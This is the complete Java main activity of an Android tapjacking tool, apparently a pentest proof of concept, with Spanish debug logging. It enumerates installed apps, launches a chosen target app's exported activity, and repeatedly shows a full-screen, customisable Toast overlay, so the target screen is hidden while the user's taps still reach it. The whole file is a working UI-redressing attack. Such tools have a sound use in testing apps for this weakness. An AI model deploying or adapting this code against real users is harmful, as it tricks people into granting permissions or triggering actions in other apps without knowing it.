package com.dsavitski.tapjacker;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;

import petrov.kristiyan.colorpicker.ColorPicker;

public class MainActivity extends AppCompatActivity {
    private EditText delayField;
    private EditText editExportedActivity;
    private EditText editCustomText;
    private Spinner packagesDropDown;
    private Button buttonColorPicker;
    private CheckBox checkboxShowLogo;
    private String[] packagesArr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        delayField = findViewById(R.id.delayField);
        packagesDropDown = findViewById(R.id.packagesDropDown);
        buttonColorPicker = findViewById(R.id.buttonColorPicker);
        editExportedActivity = findViewById(R.id.editExportedActivity);
        editCustomText = findViewById(R.id.editCustomText);
        checkboxShowLogo = findViewById(R.id.checkboxShowLogo);

        configureDropDown();
        loadPackages();
    }

//    private void configureDropDown() {
//        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
//            @Override
//            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
//                final String currentPackage = packagesArr[position];
//                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
//                if (launchIntent == null || launchIntent.getComponent() == null) {
//                    setStartActivity("");
//                    return;
//                }
//                setStartActivity(launchIntent.getComponent().getClassName());
//            }
//
//            @Override
//            public void onNothingSelected(AdapterView<?> parent) {
//                setStartActivity("");
//            }
//        });
//    }

    private void configureDropDown() {
        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                final String currentPackage = packagesArr[position];

                // Solo poner el nombre del paquete, no la actividad completa
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
                if (launchIntent == null || launchIntent.getComponent() == null) {
                    setStartActivity("");
                    return;
                }

                // Aquí va solo el nombre de la actividad principal
                String activityName = launchIntent.getComponent().getClassName();
                setStartActivity(activityName);
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
                setStartActivity("");
            }
        });
    }

    private void setStartActivity(String name) {
        editExportedActivity.setText(name);
    }

    public void runTapJacker(View view) {
        // Validar que el campo de delay no esté vacío
        String delayText = delayField.getText().toString().trim();
        if (TextUtils.isEmpty(delayText)) {
            Toast.makeText(getApplicationContext(), "Please enter a delay value", Toast.LENGTH_SHORT).show();
            return;
        }

        final int delay;
        try {
            delay = Integer.parseInt(delayText);
        } catch (NumberFormatException e) {
            Toast.makeText(getApplicationContext(), "Please enter a valid number for delay", Toast.LENGTH_SHORT).show();
            return;
        }

        final String packageName = packagesDropDown.getSelectedItem().toString();
        final String exportedActivityName = editExportedActivity.getText().toString();

        if (delay <= 3) {
            Toast.makeText(getApplicationContext(), "Delay should be 3 or more seconds", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!exportedActivityIsValid(packageName, exportedActivityName)) {
            return;
        }

        final Toast overlay = createOverlay();
        fireOverlay(overlay, delay);
        launchExportedActivity(packageName, exportedActivityName);
    }

    private void fireOverlay(final Toast toast, final int delay) {
        Thread t = new Thread() {
            public void run() {
                int timer = delay;
                while (timer > 0) {
                    toast.show();
                    if (timer == 1) {
                        Intent intent = new Intent(MainActivity.this, MainActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    }
                    try {
                        sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    timer--;
                }
            }
        };
        t.start();
    }

    void launchExportedActivity(final String packageName, final String exportedActivityName) {
        Thread t = new Thread() {
            public void run() {
                try {
                    sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                Log.d("TAPJACKER", "Intentando abrir: " + packageName + "/" + exportedActivityName);

                try {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(packageName, exportedActivityName));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Log.d("TAPJACKER", "Actividad abierta exitosamente");
                } catch (ActivityNotFoundException e) {
                    Log.e("TAPJACKER", "Actividad no encontrada, usando launcher principal");
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            launchMainActivity(packageName);
                        }
                    });
                } catch (Exception e) {
                    Log.e("TAPJACKER", "Error al abrir actividad: " + e.getMessage());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this, "Error al abrir la aplicación: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            }
        };
        t.start();
    }

    private void launchMainActivity(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            try {
                launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                Log.d("TAPJACKER", "Aplicación principal abierta como fallback");
            } catch (ActivityNotFoundException e) {
                Toast.makeText(this, "No se puede abrir la aplicación", Toast.LENGTH_SHORT).show();
                Log.e("TAPJACKER", "No se puede abrir la aplicación principal");
            }
        } else {
            Toast.makeText(this, "Aplicación no encontrada", Toast.LENGTH_SHORT).show();
            Log.e("TAPJACKER", "Intent de launcher no encontrado para: " + packageName);
        }
    }

    private boolean exportedActivityIsValid(String packageName, String exportedActivityName) {
        if (TextUtils.isEmpty(packageName)) {
            Toast.makeText(getApplicationContext(), "Select package first", Toast.LENGTH_SHORT).show();
            return false;
        }

        if (TextUtils.isEmpty(exportedActivityName)) {
            Toast.makeText(getApplicationContext(), "Set exported activity to launch", Toast.LENGTH_SHORT).show();
            return false;
        }

        // Verificar si el paquete está instalado
        try {
            getPackageManager().getPackageInfo(packageName, 0);
        } catch (PackageManager.NameNotFoundException e) {
            Toast.makeText(getApplicationContext(), "La aplicación no está instalada", Toast.LENGTH_SHORT).show();
            return false;
        }

        return true;
    }

    private Toast createOverlay() {
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        Toast overlay = Toast.makeText(this, "", Toast.LENGTH_SHORT);
        View overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
        overlay.setView(overlayView);
        overlay.setGravity(Gravity.FILL, 0, 0);

        configureOverlayElements(overlayView);

        return overlay;
    }

    private void configureOverlayElements(View overlayView) {
        int overlayColor;
        try {
            overlayColor = ((ColorDrawable) buttonColorPicker.getBackground()).getColor();
        } catch (Exception e) {
            // Fallback a color por defecto si hay error obteniendo el color
            overlayColor = Color.GREEN;
        }

        final TextView overlayText = overlayView.findViewById(R.id.overlayText);
        final ImageView overlayImage = overlayView.findViewById(R.id.overlayImage);

        if (overlayText != null) {
            overlayText.setTextColor(overlayColor);

            Editable customText = editCustomText.getText();
            if (!TextUtils.isEmpty(customText)) {
                overlayText.setText(customText);
            }
        }

        if (overlayImage != null) {
            overlayImage.setColorFilter(overlayColor);

            if (!checkboxShowLogo.isChecked()) {
                overlayImage.setVisibility(View.INVISIBLE);
            }
        }
    }

    /**
     * Loads available application packages to the dropdown menu
     */
//    private void loadPackages() {
//        List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
//        List<String> filtered = filterPackages(packages);
//        packagesArr = new String[filtered.size()];
//        packagesArr = filtered.toArray(packagesArr);
//
//        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, packagesArr);
//        packagesDropDown.setAdapter(adapter);
//    }

    private void loadPackages() {
        Log.d("DEBUG", "=== INICIANDO CARGA DE PAQUETES ===");

        List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        Log.d("DEBUG", "Total de paquetes del sistema: " + packages.size());

        List<String> filtered = filterPackages(packages);
        Log.d("DEBUG", "Paquetes después del filtro: " + filtered.size());

        if (filtered.size() == 0) {
            Log.e("DEBUG", "❌ NO SE ENCONTRARON APPS - Revisando permisos...");
            Toast.makeText(this, "No se encontraron aplicaciones", Toast.LENGTH_LONG).show();
            return;
        }

        // Mostrar los primeros 5 para verificar
        for (int i = 0; i < Math.min(5, filtered.size()); i++) {
            Log.d("DEBUG", "App " + (i+1) + ": " + filtered.get(i));
        }

        packagesArr = new String[filtered.size()];
        packagesArr = filtered.toArray(packagesArr);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, packagesArr);
        packagesDropDown.setAdapter(adapter);

        Log.d("DEBUG", "✅ Dropdown configurado con " + packagesArr.length + " apps");
    }

    /**
     * Filter packages
     */
//    private List<String> filterPackages(final List<ApplicationInfo> packages) {
//        List<String> filtered = new ArrayList<>();
//
//        for (ApplicationInfo packageInfo : packages) {
//            final String packageName = packageInfo.packageName;
//            if (!packageName.contains("com.android")) {
//                filtered.add(packageName);
//            }
//        }
//        return filtered;
//    }

    private List<String> filterPackages(final List<ApplicationInfo> packages) {
        List<String> filtered = new ArrayList<>();
        PackageManager pm = getPackageManager();

        Log.d("FILTER", "=== INICIANDO FILTRO ===");
        Log.d("FILTER", "Total paquetes a analizar: " + packages.size());

        int count = 0;
        for (ApplicationInfo packageInfo : packages) {
            final String packageName = packageInfo.packageName;

            // Verificar si la app tiene actividad launcher (apps instalables)
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);

            if (launchIntent != null) {
                // Excluir solo las apps básicas del sistema que no necesitamos
                if (!packageName.startsWith("com.android.") &&
                        !packageName.startsWith("android") &&
                        !packageName.equals("com.google.android.packageinstaller") &&
                        !packageName.equals("com.google.android.gms")) {

                    filtered.add(packageName);
                    count++;

                    // Log para debugging (mostrar solo los primeros 10)
                    if (count <= 10) {
                        Log.d("FILTER", "AGREGADO " + count + ": " + packageName);
                    }
                }
            }
        }

        Log.d("FILTER", "=== FILTRO COMPLETADO: " + filtered.size() + " apps encontradas ===");

        // Si no encuentra muchas apps, mostrar todas las que tienen launcher
        if (filtered.size() < 5) {
            Log.d("FILTER", "Pocas apps encontradas, usando filtro más amplio...");
            filtered.clear();

            for (ApplicationInfo packageInfo : packages) {
                Intent launchIntent = pm.getLaunchIntentForPackage(packageInfo.packageName);
                if (launchIntent != null) {
                    filtered.add(packageInfo.packageName);
                }
            }
            Log.d("FILTER", "Filtro amplio: " + filtered.size() + " apps");
        }

        return filtered;
    }

    public void pickColor(View view) {
        ColorPicker colorPicker = new ColorPicker(this);
        colorPicker.show();
        colorPicker.setOnChooseColorListener(new ColorPicker.OnChooseColorListener() {
            @Override
            public void onChooseColor(final int position, final int color) {
                buttonColorPicker.setBackgroundColor(color);
            }

            @Override
            public void onCancel() {
                // No operation
            }
        });
    }
}